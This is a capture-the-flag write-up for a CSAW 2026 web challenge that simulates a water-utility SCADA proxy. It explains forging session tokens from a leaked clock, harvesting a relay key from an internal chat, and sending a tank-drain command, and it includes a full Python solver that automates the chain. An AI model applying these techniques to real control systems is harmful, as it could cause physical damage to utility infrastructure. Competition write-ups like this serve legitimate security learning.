---
title: "CSAW 2026 — Low Tide: A Time-Sensitive SCADA Proxy Chain"
date: "2026-09-20"
tags: ["csaw-2026", "web", "scada", "recon"]
excerpt: "A six-stage chain behind a load balancer where only one of four workers serves the relay, the clock must be re-synced before every request, and a catch-all route manufactures false positives."
---

> **CSAW CTF 2026 · Web (500)**
> **Flag:** `csaw{time_sensitive_scada_proxy_chain}`
> (the server emits `CSAW{...}` uppercase; submit lowercase)
> **Solver:** `solve_lowtide.py` — verified end to end

> *"A water treatment utility's remote monitoring system has been left online with
> an old technician login page still reachable. The login does not work anymore, but
> the page was never actually taken down."*

The login page is a decoy. Its form posts to `#`. Everything real happens behind it,
across six sequential gates, on one of four backend workers that the load balancer
hands out at random — and several of those gates fail in ways that are
indistinguishable from you being wrong about something else entirely.

That last property is what makes this a 500-pointer.

## Architecture

| component | host | role |
|---|---|---|
| frontend | `low-tide.ctf.csaw.io` | static nginx — the decoy login page |
| backend | `low-tide-lb.ctf.csaw.io` | gunicorn/Flask, all real behaviour |
| ALB | `web-alb-prod-680046691…` | both names resolve here |

Behind the load balancer sit **four station workers**, each simulating a different
clock:

| worker | simulated date |
|---|---|
| st-01 | 2018-07-12 |
| st-02 | 2015-06-10 |
| st-03 | 2016-08-20 |
| **st-04** | **2019-03-15** |

Only **st-04** serves the relay. The ALB assigns a worker per connection, so roughly
three out of four sessions land somewhere useless — and connections re-balance
mid-session.

## Gate 1 — the obfuscated gateway

`/assets/app.js` ships deliberately mangled. One line is ROT47:

```
4@?DE vp%t(p*  →  const GATEWAY
```

Decode the rest from ROT47 to hex to base64 and you get:

```
https://low-tide-lb.ctf.csaw.io/station/checkin
```

Two hex tokens lost a digit to the same corruption (`6`→`61`, `3`→`31`); base64
alignment tells you what they must have been. The scrambled `renderStatus` function
below it is pure noise — I de-interleaved the whole thing character by character to
confirm it hides nothing, so you don't have to.

`const REQUIRED_AGENT =` is left blank in the file. That's gate 2.

## Gate 2 — the agent, and a clock stuck in the past

`robots.txt` carries five agent strings in comments:

```
# StationSync-Agent/2.1
# FieldSync-Client/3.0
# MonitorAgent/2.2
# StationSync-Agent/2.0
# RelayCheck-Bot/1.9
```

Only `StationSync-Agent/2.1` is accepted. (Its `Disallow` entries are decoys — they
404 under every agent.)

Send the wrong one and the server says:

```json
{"reason": "code_mismatch: expected token derived from current sync time",
 "sync_time": "2019-01-02T03:14:07Z"}
```

That timestamp never advances, no matter how long you watch it — this is the "low
tide" the challenge is named for. It belongs to **no station**, and `03:14:07` is the
2038 signed-integer rollover, an in-joke about broken clocks. It's a placeholder
shown to unauthorised agents.

The *real* clocks belong to the workers, and they do advance — one second per second.

## Gate 3 — gateway auth

With the right agent, `POST /station/checkin` with `action=checkin` sets a 16-hex
`sid` cookie. Sending `token=probe` makes the worker leak its own simulated clock.
From there:

```python
token = md5(sid + str(int(station_epoch)))
```

**This is where the challenge starts fighting you.** That clock advances in real
time, so a token computed one second ago is already stale — and a stale token
returns `code_mismatch`, *the same error you get for a wrong credential*.

Every single probe from here on must re-read the clock immediately before firing.
Skip it and you will reject correct answers. I did exactly that, and it cost me hours.

## Gate 4 — the virtual filesystem

```
POST /station/checkin/api/v1/<station_id>/<path>
body: action=checkin & token=<fresh>
```

POST only — GET falls through to a catch-all. Following the breadcrumbs:

`station.log` mentions an unlisted path → `.logs/err_3005.log` → "chat bridge
relocated: `config/relay_chat.js`" → "endpoint: v2/chat" → `config/sync.conf`:

```
chat bridge auth: Authorization: Bot <token>
token=md5(station_id+MMM+DD+YY+HH+MM) all lowercase/zero-padded, e.g. mar05191324
params: id=<message id, batch of 5>
```

The config file documents the next gate's authentication scheme. (It's a dict, not a
real filesystem — traversal and source retrieval are both dead ends, which I
confirmed the hard way with raw sockets.)

## Gate 5 — the chat bridge, and the actual briefing

```
GET /station/checkin/api/v2/chat?id=N
Authorization: Bot md5(station_id + strftime("%b%d%y%H%M").lower())
```

Sixty messages, five per request. The first forty-four are scenery — Modbus polling
intervals, RTU batteries, a switch replacement. The payload is messages 45–60:

```
[49] admin_lena > for the control side - for now we're only exposing raise and
                  lower on the water level
[53] admin_lena > I'll wire the relay through station 4, it's the only one with
                  the proxy route set up
[55] admin_lena > yeah, 4f9a-77c2-e01d, admin box is at 10.10.14.31 same as always
[56] admin_lena > if the level swings too far either direction the system throws
                  a hard alarm, so don't test with big values unless you mean it
```

A relay key, an internal IP, a control surface, and — read it again — an explicit
instruction for how to trigger the win condition.

Worth noting: a teammate's earlier dump stopped at message 10, which contains none
of this. The batching makes it easy to assume you've seen the conversation when
you've seen a sixth of it.

## Gate 6 — the relay

`POST /station/checkin/relay`, on st-04 only. Four more things have to be right, and
each wrong one produces a *different* error — which is the only reason this is
tractable:

| response | what it means |
|---|---|
| long `code_mismatch` + frozen 2019-01-02 clock | wrong User-Agent |
| short `code_mismatch` | stale/missing gateway token |
| `relay_auth_failed` | missing/wrong `X-Relay-Key` |
| `invalid_relay_target` | missing/wrong `X-Relay-Target` |
| `invalid_command` | no usable `cmd` |
| `unsupported_action` | **wrong worker** — re-pin, *not* a real result |
| `accepted` + `relay{}` | success |

The final request:

```http
POST /station/checkin/relay HTTP/1.1
User-Agent:     StationSync-Agent/2.1
Authorization:  Bot md5(station_id + stamp)
X-Relay-Key:    4f9a-77c2-e01d          ← header, not a form field
X-Relay-Target: http://10.10.14.31/     ← scheme and trailing slash both matter

action=checkin&token=md5(sid+epoch)&cmd=CMD:WATER:LOWER:50
```

```json
{"relay": {"alarm": "LOW LEVEL",
           "flag": "CSAW{time_sensitive_scada_proxy_chain}",
           "status": "critical",
           "water_level": 20},
 "result": "accepted", "role": "system_check", "station_id": "st-04"}
```

Draining the tank trips the `LOW LEVEL` alarm, exactly as message 56 warned — and the
alarm carries the flag.

## Solver

Runs the whole chain unattended: deobfuscates the gateway out of `app.js`, pins a session to st-04 (one probe request identifies the worker by its 2019 clock), authenticates, and fires the drain command. `--chat` also dumps all 60 messages. Verified end to end — it pulled the flag on the first command.


```python solve_lowtide.py
#!/usr/bin/env python3
"""
Low Tide (CSAW 2026, web) — full-chain solver.
Flag: csaw{time_sensitive_scada_proxy_chain}

CHAIN
  1. assets/app.js  : ROT47 -> hex -> base64 -> gateway URL
  2. robots.txt     : comments leak the required User-Agent (StationSync-Agent/2.1)
  3. gateway auth   : token = md5(sid + station_epoch); token=probe leaks the clock
  4. virtual FS     : POST /station/checkin/api/v1/<st>/<path>
  5. chat bridge    : GET  /station/checkin/api/v2/chat?id=N
                      Authorization: Bot md5(station_id + %b%d%y%H%M lowercase)
  6. relay          : POST /station/checkin/relay   (st-04 worker ONLY)
                      X-Relay-Key / X-Relay-Target headers + cmd=CMD:WATER:LOWER:<n>

THE FOUR TRAPS (each cost hours)
  * cmd is "cmd" — not command/action/op, and not a header.
  * The key/target are HEADERS. Form fields give relay_auth_failed forever.
  * action stays "checkin". action=raise diverts into a branch that never reaches
    the token check, so a correct token *looks* wrong (code_mismatch).
  * Only st-04 serves /relay; connections re-balance mid-session. Treat
    unsupported_action as "wrong worker, re-pin" — NEVER as a real result,
    or you will log false negatives against st-01/02/03.
"""
import argparse, base64, datetime, hashlib, re, sys, time
import requests

ROOT  = 'https://low-tide-lb.ctf.csaw.io'
BASE  = ROOT + '/station/checkin'
UA    = 'StationSync-Agent/2.1'
KEY   = '4f9a-77c2-e01d'          # chat msg 55
TGT   = 'http://10.10.14.31/'     # admin box; scheme + trailing slash matter
md5   = lambda x: hashlib.md5(x.encode()).hexdigest()


# ---------- stage 1: recover the gateway from the obfuscated JS ----------
def stage1_gateway():
    js = requests.get('https://low-tide.ctf.csaw.io/assets/app.js', timeout=20).text
    blob = [l for l in js.split('\n') if l.startswith('4@?DE')][0]
    rot47 = ''.join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c
                    for c in blob)
    toks = rot47.split()[2:]
    # corruption dropped a digit from two hex tokens; base64 alignment repairs them
    toks = ['61' if t == '6' else '31' if t == '3' else t for t in toks]
    s = bytes(int(t, 16) for t in toks).decode()
    return base64.b64decode(s.split('"')[1]).decode()


# ---------- station session pinned to st-04 ----------
class Station:
    """A session pinned to one worker. st-04 is identified by its 2019-03 clock."""
    def __init__(self, want='st-04', tries=300):
        for _ in range(tries):
            s = requests.Session(); s.headers['User-Agent'] = UA
            try:
                r = s.post(BASE, data={'action': 'checkin', 'token': 'probe'}, timeout=20)
                sync = r.json().get('sync_time', '')
            except Exception:
                time.sleep(1.5); continue
            if want == 'st-04' and not sync.startswith('2019-03'):
                continue                      # cheap reject: one request, no login
            sid = s.cookies.get('sid')
            if not sid:
                continue
            self.s, self.sid = s, sid
            self._set_clock(sync)
            if self._login():
                return
        raise SystemExit(f'could not pin {want}')

    def _set_clock(self, sync):
        dt = datetime.datetime.strptime(sync, '%Y-%m-%dT%H:%M:%SZ') \
                              .replace(tzinfo=datetime.timezone.utc)
        self.epoch0, self.local0 = int(dt.timestamp()), time.time()

    def now(self):   return self.epoch0 + (time.time() - self.local0)
    def token(self): return md5(f'{self.sid}{int(self.now())}')
    def stamp(self):
        return datetime.datetime.fromtimestamp(self.now(), datetime.timezone.utc) \
                       .strftime('%b%d%y%H%M').lower()
    def bot(self):   return md5(self.station + self.stamp())

    def resync(self):
        """The clock drifts 1s/s. A stale token returns code_mismatch, which is
        indistinguishable from a wrong credential — so resync before every call."""
        for _ in range(8):
            try:
                r = self.s.post(BASE, data={'action': 'checkin', 'token': 'probe'}, timeout=20)
            except Exception:
                time.sleep(2); continue
            if r.status_code == 429: time.sleep(6); continue
            if 'station_exhausted' in r.text: time.sleep(16); continue
            j = r.json()
            if 'sync_time' in j:
                self._set_clock(j['sync_time']); return True
        return False

    def _login(self):
        for _ in range(6):
            r = self.s.post(BASE, data={'action': 'checkin', 'token': self.token()}, timeout=20)
            if 'accepted' in r.text:
                self.station = r.json()['station_id']; return True
            if 'sync_time' in r.text:
                try: self._set_clock(r.json()['sync_time'])
                except Exception: pass
            time.sleep(0.3)
        return False


# ---------- generic relay call ----------
def relay(st, cmd, tries=10):
    for _ in range(tries):
        st.resync()
        try:
            r = st.s.post(BASE + '/relay',
                          data={'action': 'checkin', 'token': st.token(), 'cmd': cmd},
                          headers={'Authorization': f'Bot {st.bot()}',
                                   'X-Relay-Key': KEY, 'X-Relay-Target': TGT},
                          timeout=25)
        except Exception:
            time.sleep(3); continue
        t = r.text
        if r.status_code == 429:            time.sleep(6);  continue
        if 'station_exhausted' in t:        time.sleep(16); continue
        if 'code_mismatch' in t:            continue          # stale token
        if 'unsupported_action' in t or 'session_invalidated' in t:
            return None                     # wrong worker -> caller re-pins
        return r
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--chat',  action='store_true', help='also dump the 60 chat messages')
    ap.add_argument('--steps', default='50,30,20,10', help='LOWER magnitudes to try')
    a = ap.parse_args()

    print(f'[1] gateway      : {stage1_gateway()}', flush=True)
    print('[2] pinning st-04 (only worker serving /relay) ...', flush=True)
    st = Station()
    print(f'[3] authenticated: station={st.station} sid={st.sid}', flush=True)

    if a.chat:
        seen = {}
        i = 1
        while i <= 56:
            r = st.s.get(BASE + '/api/v2/chat', params={'id': i},
                         headers={'Authorization': f'Bot {st.bot()}'}, timeout=20)
            if r.status_code == 429 or 'slow down' in r.text:
                time.sleep(5.5); continue
            for m in r.json().get('messages', []):
                seen[m['id']] = m
            i += 5; time.sleep(1.2)
        for k in sorted(seen):
            print(f"    [{k:2}] <{seen[k]['from']}> {seen[k]['text']}", flush=True)

    print('[4] draining tank to trip the LOW LEVEL alarm ...', flush=True)
    for mag in a.steps.split(','):
        cmd = f'CMD:WATER:LOWER:{mag.strip()}'
        r = relay(st, cmd)
        if r is None:
            print(f'    {cmd}: lost st-04, re-pinning', flush=True)
            st = Station(); continue
        print(f'    {cmd} -> {r.text.strip()[:220]}', flush=True)
        f = re.search(r'(?i)csaw\w*\{[^}]*\}', r.text)
        if f:
            print(f'\n*** FLAG: {f.group(0).lower()} ***', flush=True)
            return 0
        time.sleep(1.0)
    print('no flag: re-run (level resets / worker drift)', flush=True)
    return 1


if __name__ == '__main__':
    sys.exit(main())
```

## Why it resisted

Four traps, each of which manufactures a false negative. Together they make correct
guesses look wrong, which is far more expensive than making wrong guesses look wrong.

**1. The parameter is `cmd`.** Not `command`, not `action`, not `op`, and not a
header. I burned roughly 45 parameter names and 60 values against this before the
author published a hint. Every one returned the same generic `invalid_command`,
because a wrong *name* and a wrong *value* are indistinguishable — there's no oracle
to separate them.

**2. `action` must stay `checkin`.** Setting `action=raise` diverts into a branch
that never reaches the token check, so a *perfectly correct* token comes back as
`code_mismatch`. I read that as "the token must be action-bound" and spent a long
stretch brute-forcing token formulas — `md5(sid+epoch+action)` and friends — that
never existed. The evidence was right there (`action=checkin` reached
`relay_auth_failed` while `action=raise` didn't) and I read it backwards.

**3. The key and target are headers.** Form fields `key` and `relay_key` return
`relay_auth_failed` forever. I found `X-Relay-Key` by fuzzing *header names* with the
known-good value — and critically, only after adding clock re-sync, because on the
first pass a stale token masked the hit as `code_mismatch`.

**4. Station drift.** Only st-04 serves `/relay`. The other three answer identical
requests with `unsupported_action`, and connections re-balance mid-session. Treat
that response as "wrong worker, re-pin" — never as a result — or you will log
failures against candidates that were never actually tested.

## Two false positives worth recording

**`/relay/raise` returning `accepted` is not success.** `/station/checkin/<anything>`
is a catch-all that returns an identical `accepted` body for *any* path once your
token is valid. A teammate reported `/relay/raise` and `/relay/lower` as a
breakthrough on exactly this basis. The disproof is one request:
`/relay/zzznonsense` returns the same thing — as does `/zzznonsense`, with no relay
headers at all. **Always run a nonsense control before believing a positive.**

**Random 502s mean nothing.** I saw one on `/field/checkin` and one on
`cmd=water_level`, and chased both. Neither reproduced across retries. Infra blips.
Likewise, roughly 18% of requests return a `throttled` 429 at random — I twice
reported `action=sync` as a real action purely because a 429 landed on it instead of
`unsupported_action`.

## What to take from it

**Distinct error messages are what make a six-gate chain solvable.** Had every
failure returned a generic 403, this challenge would have been unapproachable. The
error ladder is a map: each distinct string tells you exactly which gate you're at,
so you can work them one at a time instead of searching a combinatorial space.
Gate 5 was brutal precisely *because* it collapsed two unknowns into one message.

**A moving clock turns every negative result into a maybe.** The single highest-value
change I made was re-syncing before every attempt. Before that, my results were a mix
of real answers and stale-token rejections, with no way to tell them apart — which is
strictly worse than no results, because it looks like data.

**When infrastructure is part of the challenge, verify which backend answered you.**
Load balancing silently invalidated entire test runs. Checking `station_id` on the
same connection before trusting any negative is the difference between evidence and
noise.
